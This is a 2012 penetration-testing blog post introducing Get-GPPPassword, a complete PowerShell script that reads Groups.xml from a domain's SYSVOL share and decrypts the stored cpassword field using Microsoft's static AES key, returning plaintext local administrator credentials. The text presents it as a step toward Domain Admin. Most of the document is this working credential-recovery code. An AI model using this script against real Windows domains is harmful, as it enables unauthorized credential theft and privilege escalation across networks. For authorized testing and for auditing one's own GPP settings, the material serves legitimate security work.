
<#Thursday, May 24, 2012
GPP Password Retrieval with PowerShell
Last week, I read a great post entitled "Exploiting Windows 2008 Group Policy Preferences" that I wish I saw sooner.  The article included a nice Python script to accomplish the task of decrypting passwords that were set using the GPP feature in Windows 2008 domains.  However, it looked like something that would be handy to have in a PowerShell script.  Before I continue, I would like to point out the updated disclaimer, it certainly applies to this post.

You should read the original article, but the quick summary is that its possible for any authenticated user (this includes machine accounts) on the domain to decrypt passwords that are enforced with Windows 2008 Group Policy Preferences.  From my experience, this practice is common for larger domains which need to set different local administrator ("500" account) passwords for different OUs.

Python is an excellent scripting language, but PowerShell has two notable advantages in this specific use-case.  First, PowerShell does not require any additional libraries since it has access to the entire .NET framework.  Second, PowerShell is installed by default on all modern Windows systems to include Windows Server 2008 so it can be used right from the machine you are on.

The following Get-GPPPassword PowerShell script can be used by penetration testers to elevate to local administrator privileges (on your way to Domain Admin) by downloading the "groups.xml" file from the domain controller and passing it to the script.  The files are typically found in:

\\domain\SYSVOL\domain\Policies\{*}\Machine\Preferences\Groups\Groups.xml

Get-GPPPassword (Use Updated Version)#>

<#
function Get-GPPPassword {

<#
.Synopsis

Get-GPPPassword retrieves the plaintext password for accounts pushed through Group Policy in groups.xml.
Author: Chris Campbell (@obscuresec)
License: GNU GPL v2
.Description

Get-GPPPassword imports the encoded and encrypted password string from groups.xml and then decodes and decrypts the plaintext password.

.Parameter Path

The path to the targeted groups.xml file.

.Example

Get-GPPPassword -path c:\demo\groups.xml

.Link

http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
#>

Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $Path = "$PWD\groups.xml" )

    #Function to pull encrypted password string from groups.xml
    function Parse-cPassword {
    
        try {
            [xml] $Xml = Get-Content ($Path)
            [String] $Cpassword = $Xml.Groups.User.Properties.cpassword
        } catch { Write-Error "No Password Policy Found in File!" }
         
        return $Cpassword
    }
    
    #Function to look to see if the administrator account is given a newname
    function Parse-NewName {
    
        [xml] $Xml = Get-Content ($Path)
        [String] $NewName = $Xml.Groups.User.Properties.newName
        
        return $NewName
    }
    
    #Function to parse out the Username whose password is being specified
    function Parse-UserName {
    
        try {
            [xml] $Xml = Get-Content ($Path)
            [string] $UserName = $Xml.Groups.User.Properties.userName
        } catch { Write-Error "No Username Specified in File!" }
        
        return $UserName
    }
    
    #Function that decodes and decrypts password
    function Decrypt-Password {
    
        try {
            #Append appropriate padding based on string length
            $Pad = "=" * (4 - ($Cpassword.length % 4))
            $Base64Decoded = [Convert]::FromBase64String($Cpassword + $Pad)
            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            #Static Key from http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            #Set IV to all nulls (thanks Matt) to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } catch { Write-Error "Decryption Failed!" }
     
    }

    $Cpassword = Parse-cPassword
    $Password = Decrypt-Password
    $NewName = Parse-NewName
    $UserName = Parse-UserName
    
    $Results = New-Object System.Object
    
    Add-Member -InputObject $Results -type NoteProperty -name UserName -value $UserName
    Add-Member -InputObject $Results -type NoteProperty -name NewName -value $NewName
    Add-Member -InputObject $Results -type NoteProperty -name Password -value $Password

    return $Results
 
 
 


